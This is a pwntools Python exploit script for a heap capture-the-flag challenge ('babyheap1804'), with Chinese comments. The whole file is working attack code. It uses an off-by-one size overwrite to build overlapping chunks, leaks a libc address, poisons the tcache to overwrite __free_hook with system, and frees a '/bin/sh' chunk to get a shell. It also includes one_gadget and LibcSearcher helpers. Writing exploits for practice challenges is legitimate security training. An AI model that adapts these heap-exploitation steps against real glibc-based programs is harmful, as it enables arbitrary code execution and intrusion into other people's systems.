#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './babyheap1804'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data            : io.send(str(data))
sa   = lambda delim,data      : io.sendafter(str(delim), str(data))
sl   = lambda data            : io.sendline(str(data))
sla  = lambda delim,data      : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096       : io.recv(numb)
ru   = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32 = lambda data            : u32(data.ljust(4, '\x00'))
uu64 = lambda data            : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ga   = lambda job=""          : gdb.attach(io, job) if local else 0
ia   = lambda                 : io.interactive()


# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def c(idx):
    sla("Command: ", idx)

def new(size):
    c(1)
    sla("Size: ", size)

def update(idx, size, content):
    c(2)
    sla("Index: ", idx)
    sla("Size: ", size)
    sla("Content: ", content)

def show(idx):
    c(4)
    sla("Index: ", idx)

def delete(idx):
    c(3)
    sla("Index: ", idx)

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    #start here
    for i in xrange(8):
        new(0x18)
    for i in list(range(7))[::-1]:
        update(i, 0x19, 'a'*0x18+'\xf1')
        delete(i+1)
    new(0x18) #1
    new(0x18) #2
    new(0x58) #3
    new(0x58) #4 这三个是为0xf1做准备的
    new(0x58) #5
    new(0x18) #6
    new(0x18) #7
    update(1, 0x19, 'a'*0x18 + '\x31')
    delete(2)
    new(0x28) #2
    update(2, 0x19, 'a'*0x10 + p64(0)+ '\xf1')
    # malloc.c #1402 这里是报错
    # malloc.c #4276 这里检测
    # malloc.c #4299 这里调用
    update(5, 0x50, flat([0, 0, 0, 0, 0xf0, 0x21, 0, 0, 0, 0x21]))
    delete(3) #3 未使用
    show(2)
    ru('\x00'*7)
    ru('\x00'*7)
    addr = uu64(r(6))
    lg("addr", addr)
    libc.address = addr - 0x3ebca0

    # tcache 攻击
    update(5, 0x59, 'a'*0x58 + '\x31')
    #delete(1)
    delete(6)
    delete(7)
    new(0x28) #3
    update(3, 0x28, flat([0, 0, 0, 0x18, libc.symbols['__free_hook']]))
    ga()
    new(0x18) #6
    new(0x18) #7
    update(0, 0x8, "/bin/sh\x00")
    update(7, 0x8, p64(libc.symbols['system']))
    delete(0)
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("subprocess not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)

